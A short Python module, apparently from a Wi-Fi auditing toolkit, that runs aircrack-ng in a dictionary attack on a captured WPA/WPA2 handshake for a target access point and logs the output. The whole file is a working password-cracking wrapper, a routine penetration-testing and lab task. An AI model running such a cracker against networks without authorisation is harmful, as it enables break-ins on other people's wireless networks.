# === wifi_auditor/cracker.py ===

import subprocess  # Used to run system-level commands such as aircrack-ng

def crack_handshake(target_bssid, handshake_file, wordlist_file, log_file="aircrack_out.log"):
    """
    Attempts to crack a WPA/WPA2 handshake using a dictionary attack with aircrack-ng.

    Parameters:
        target_bssid (str): The MAC address of the target access point.
        handshake_file (str): Path to the captured handshake (.pcap) file.
        wordlist_file (str): Path to the dictionary (wordlist) file to use.
        log_file (str): File to save the output from aircrack-ng (default: "aircrack_out.log").
    """

    print("[*] Cracking handshake with Aircrack-ng...")

    # Construct the command to run aircrack-ng with required parameters
    cmd = ["aircrack-ng", "-w", wordlist_file, "-b", target_bssid, handshake_file]

    # Open the log file for writing and execute the command
    # stdout and stderr are redirected to the same log file
    with open(log_file, "w") as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT)

    # Inform the user that cracking attempt results are saved
    print(f"[*] Output saved to {log_file}")
